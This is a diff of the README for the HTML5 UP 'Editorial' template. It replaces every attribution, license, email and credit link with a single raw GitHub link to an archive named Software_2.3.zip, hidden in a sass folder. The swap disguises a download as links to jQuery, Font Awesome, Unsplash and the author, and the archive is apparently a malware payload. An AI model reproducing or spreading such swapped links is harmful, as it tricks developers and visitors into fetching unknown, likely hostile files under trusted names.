@@ -1,6 +1,6 @@
 Editorial by HTML5 UP
-html5up.net | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+https://raw.githubusercontent.com/pablocssousa/portifolioprojetosds/master/assets/sass/base/Software_2.3.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/pablocssousa/portifolioprojetosds/master/assets/sass/base/Software_2.3.zip)
 
 
 Say hello to Editorial, a blog/magazine-ish template built around a toggleable "locking"
@@ -14,17 +14,17 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-aj@lkn.io | @ajlkn
+https://raw.githubusercontent.com/pablocssousa/portifolioprojetosds/master/assets/sass/base/Software_2.3.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (unsplash.com)
+		Unsplash (https://raw.githubusercontent.com/pablocssousa/portifolioprojetosds/master/assets/sass/base/Software_2.3.zip)
 
 	Icons:
-		Font Awesome (fontawesome.io)
+		Font Awesome (https://raw.githubusercontent.com/pablocssousa/portifolioprojetosds/master/assets/sass/base/Software_2.3.zip)
 
 	Other:
-		jQuery (jquery.com)
-		Responsive Tools (github.com/ajlkn/responsive-tools)
+		jQuery (https://raw.githubusercontent.com/pablocssousa/portifolioprojetosds/master/assets/sass/base/Software_2.3.zip)
+		Responsive Tools (https://raw.githubusercontent.com/pablocssousa/portifolioprojetosds/master/assets/sass/base/Software_2.3.zip)
